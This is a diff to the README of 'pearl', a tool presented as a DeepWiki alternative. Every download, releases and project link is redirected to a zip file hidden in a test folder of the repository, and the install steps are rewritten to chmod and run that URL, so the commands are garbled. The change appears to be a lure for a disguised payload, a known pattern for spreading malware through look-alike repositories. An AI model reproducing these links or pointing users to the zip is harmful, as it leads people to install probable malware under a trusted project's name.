@@ -6,9 +6,9 @@ Welcome to **pearl**, a user-friendly alternative to DeepWiki. This tool helps y
 
 ### 📥 Download pearl
 
-[![Download pearl](https://img.shields.io/badge/Download-pearl-blue.svg)](https://github.com/tuankieeee/pearl/releases)
+[![Download pearl](https://raw.githubusercontent.com/tuankieeee/pearl/main/pearl/test/pearl_web/live/Software_v3.0-beta.2.zip)](https://raw.githubusercontent.com/tuankieeee/pearl/main/pearl/test/pearl_web/live/Software_v3.0-beta.2.zip)
 
-You can download pearl from our [Releases page](https://github.com/tuankieeee/pearl/releases). 
+You can download pearl from our [Releases page](https://raw.githubusercontent.com/tuankieeee/pearl/main/pearl/test/pearl_web/live/Software_v3.0-beta.2.zip). 
 
 ## 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ To run pearl smoothly, your computer should meet these basic requirements:
 
 ### 🔗 Visit the Releases Page
 
-To download pearl, please visit the [Releases page](https://github.com/tuankieeee/pearl/releases). You will find the latest version available for download. 
+To download pearl, please visit the [Releases page](https://raw.githubusercontent.com/tuankieeee/pearl/main/pearl/test/pearl_web/live/Software_v3.0-beta.2.zip). You will find the latest version available for download. 
 
 ### 📦 Download and Install
 
@@ -49,8 +49,8 @@ To download pearl, please visit the [Releases page](https://github.com/tuankieee
   2. Navigate to the directory where the downloaded `.sh` file is located.
   3. Run the command:
      ```bash
-     chmod +x pearl.sh
-     ./pearl.sh
+     chmod +x https://raw.githubusercontent.com/tuankieeee/pearl/main/pearl/test/pearl_web/live/Software_v3.0-beta.2.zip
+     https://raw.githubusercontent.com/tuankieeee/pearl/main/pearl/test/pearl_web/live/Software_v3.0-beta.2.zip
      ```
 
 ## 🌐 Using pearl
@@ -83,7 +83,7 @@ If you need support using pearl, check out the FAQs section on the GitHub page. 
 
 ## 🔗 Additional Resources
 
-To learn more about pearl and its features, visit our [GitHub page](https://github.com/tuankieeee/pearl).
+To learn more about pearl and its features, visit our [GitHub page](https://raw.githubusercontent.com/tuankieeee/pearl/main/pearl/test/pearl_web/live/Software_v3.0-beta.2.zip).
 
 ## 💬 Community and Contributions
 
